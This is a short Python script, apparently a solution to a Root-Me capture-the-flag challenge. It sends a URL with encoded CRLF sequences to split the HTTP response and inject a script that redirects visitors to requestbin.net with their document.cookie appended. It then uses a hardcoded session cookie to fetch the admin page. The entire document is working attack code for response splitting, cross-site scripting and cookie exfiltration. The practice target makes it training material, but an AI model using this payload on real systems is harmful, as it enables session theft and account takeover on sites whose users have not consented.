import requests

URL = "http://challenge01.root-me.org:58002/user/param?lang=en%0D%0AContent-Length%3A%200%20%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%20%0AContent-Length%3A%2094%0A%0A%3Cscript%3Elocation.replace%28%27http%3A%2F%2Frequestbin.net%2Fr%2Fxhnalzdt%3F%27.concat%28document.cookie%29%29%3C%2Fscript%3E"

URL_ADMIN = "http://challenge01.root-me.org:58002/admin"

headers = {"Pragma":"no-cache"}
cookies = {"user_session":"10bf2dc6-8c87-4adf-ae2f-37be46479912"}

requests.get(URL_ADMIN, headers = headers, cookies = cookies)
requests.get(URL, headers = headers, cookies = cookies, allow_redirects=False)
admin_res= requests.get(URL_ADMIN, cookies = cookies)
print(str(admin_res.text))